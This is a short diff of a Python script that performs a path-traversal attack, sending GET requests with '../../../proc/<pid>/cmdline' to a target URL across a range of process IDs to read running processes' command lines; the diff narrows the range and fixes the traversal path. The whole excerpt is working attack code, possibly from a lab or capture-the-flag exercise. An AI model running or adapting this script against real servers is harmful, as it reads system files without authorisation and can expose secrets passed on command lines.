@@ -9,8 +9,8 @@ url="http://vulnerable.website.com"
 print("searching:")
 
 # for loop trough 1-10000 to look for IDs in this range
-for i in range(1, 10000):
-  tar_url= url + "../../../../../../../proc/"+ str(i) +"/cmdline"
+for i in range(1, 1000):
+  tar_url= url + "/../../../../../../proc/"+ str(i) +"/cmdline"
   # Makes the GET-Request and saves the content + length
   r = requests.get(tar_url)
   length_content = len(r.content)
